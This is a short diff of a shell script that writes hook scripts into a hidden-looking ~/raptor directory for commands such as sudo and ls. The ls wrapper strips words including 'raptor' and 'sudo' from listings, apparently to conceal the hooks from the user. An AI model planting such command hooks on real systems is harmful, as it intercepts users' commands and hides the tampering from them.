@@ -10,7 +10,7 @@ chmod +x ~/raptor/sudo
 
 #Hook ls
 echo "#!/bin/bash" > ~/raptor/ls
-echo "/bin/ls -C --color=always \$@ | sed 's/ls//g' | sed 's/cd//g' | sed 's/sudo//g' | sed 's/raptor//g'" >> ~/raptor/ls
+echo "/bin/ls -C --color=always \$@ | sed 's/ls//g' | sed 's/cd//g' | sed 's/sudo//g' | sed 's/raptor//g' | cat" >> ~/raptor/ls
 chmod +x ~/raptor/ls
 
 #Hook echo
